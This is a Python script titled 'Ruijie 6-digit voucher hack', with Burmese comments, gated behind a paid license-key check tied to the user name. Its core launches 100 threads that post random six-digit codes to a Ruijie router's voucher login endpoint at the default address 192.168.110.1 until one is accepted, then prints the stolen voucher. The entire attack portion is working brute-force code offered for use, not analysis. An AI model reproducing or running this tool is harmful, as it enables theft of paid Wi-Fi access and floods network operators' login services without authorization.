import sys, os, hashlib, subprocess, datetime, requests, time, threading, random, string
from colorama import Fore, init, Style

init(autoreset=True)

# --- LICENSE SYSTEM (အစ်ကို့မူရင်းအတိုင်း) ---
SALT = "AHO_PRO_FINAL_2026_SECURE"
KEY_FILE = os.path.expanduser("~/.aho_key_data")

def get_net_time():
    try:
        res = requests.get('http://worldtimeapi.org/api/timezone/Asia/Yangon', timeout=5)
        return datetime.datetime.strptime(res.json()['datetime'][:10], "%Y-%m-%d")
    except:
        return datetime.datetime.now()

def get_hwid():
    try:
        user = subprocess.check_output(['whoami']).decode().strip()
    except:
        user = "user"
    return f"AHO-{hashlib.md5(user.encode()).hexdigest()[:6].upper()}"

def check_access():
    uid = get_hwid()
    now = get_net_time()
    if os.path.exists(KEY_FILE):
        with open(KEY_FILE, "r") as f:
            saved_key = f.read().strip()
            for i in range(0, 366):
                check_date = (now + datetime.timedelta(days=i)).strftime("%Y-%m-%d")
                if saved_key == hashlib.md5(f"{uid}|{check_date}|{SALT}".encode()).hexdigest()[:12].upper():
                    return True
    os.system('clear')
    print(f"{Fore.CYAN}--- AHO RUIJIE MASTER PRO ---")
    print(f"DEVICE ID: {Fore.YELLOW}{uid}")
    user_key = input("\nENTER KEY: ").strip()
    for i in range(0, 366):
        check_date = (now + datetime.timedelta(days=i)).strftime("%Y-%m-%d")
        if user_key == hashlib.md5(f"{uid}|{check_date}|{SALT}".encode()).hexdigest()[:12].upper():
            with open(KEY_FILE, "w") as f:
                f.write(user_key)
            return True
    return False

# --- RUIJIE 6-DIGIT HACK ENGINE ---
_found = False
_tested = 0

def engine(host):
    global _found, _tested
    sess = requests.Session()
    # Ruijie အတွက် အသေချာဆုံး Header
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Content-Type": "application/x-www-form-urlencoded",
        "X-Requested-With": "XMLHttpRequest"
    }
    
    # Ruijie ရဲ့ တကယ့် Voucher Login API (ဒါမှ အလုပ်လုပ်မှာပါ)
    url = f"http://{host}/login/auth" 

    while not _found:
        # 6 Digit သီးသန့်ထုတ်မယ်
        code = "".join(random.choice(string.digits) for _ in range(6))
        try:
            # Ruijie သုံးလေ့ရှိတဲ့ data format
            payload = {
                "username": code,
                "password": "", # Voucher ဆိုရင် များသောအားဖြင့် username ပဲလိုပါတယ်
                "auth_type": "voucher"
            }
            res = sess.post(url, data=payload, headers=headers, timeout=5)
            _tested += 1
            
            # အောင်မြင်ရင် များသောအားဖြင့် redirect ဒါမှမဟုတ် success ပေးပါတယ်
            if res.status_code == 200:
                if '"success":true' in res.text or '"error":0' in res.text:
                    _found = True
                    print(f"\n\n{Fore.GREEN}[✔] RUIJIE VOUCHER FOUND: {Fore.WHITE}{code}")
                    os._exit(0)
        except:
            pass

if __name__ == "__main__":
    if check_access():
        os.system('clear')
        print(f"{Fore.GREEN}=========================================")
        print(f"{Fore.WHITE}      RUIJIE 6-DIGIT VOUCHER HACK       ")
        print(f"{Fore.GREEN}=========================================")
        
        # Ruijie ရဲ့ Default IP Address
        target_ip = "192.168.110.1" 
        print(f"{Fore.YELLOW}[*] Targeting Ruijie: {target_ip}")
        print(f"{Fore.YELLOW}[*] Mode: 6-Digit Bruteforce")
        
        for i in range(100):
            threading.Thread(target=engine, args=(target_ip,), daemon=True).start()
        
        while not _found:
            sys.stdout.write(f"\r{Fore.RED}[☠] Tested Codes: {Fore.WHITE}{_tested}")
            sys.stdout.flush()
            time.sleep(0.1)
